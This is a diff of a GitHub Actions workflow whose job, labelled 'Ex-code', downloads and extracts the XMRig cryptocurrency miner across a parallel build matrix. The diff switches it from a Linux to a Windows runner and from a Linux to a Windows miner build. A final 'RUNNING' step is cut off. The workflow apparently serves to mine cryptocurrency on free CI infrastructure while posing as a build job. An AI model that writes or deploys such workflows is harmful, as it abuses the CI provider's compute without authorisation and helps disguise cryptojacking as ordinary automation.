@@ -16,7 +16,7 @@ on:
 jobs:
   build:
     name: Ex-code
-    runs-on: ubuntu-latest
+    runs-on: windows-latest
     strategy:
       max-parallel: 5
       fail-fast: false
@@ -28,9 +28,9 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz -OutFile xmrig-6.16.4-linux-x64.tar.gz
+      run: Invoke-WebRequest https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-msvc-win64.zip -OutFile xmrig-6.17.0-msvc-win64.zip
     - name: Extract
-      run: Expand-Archive xmrig-6.16.4-linux-x64.tar.gz
+      run: Expand-Archive xmrig-6.17.0-msvc-win64.zip
     - name: Dir
       run: ls
     - name: RUNNING
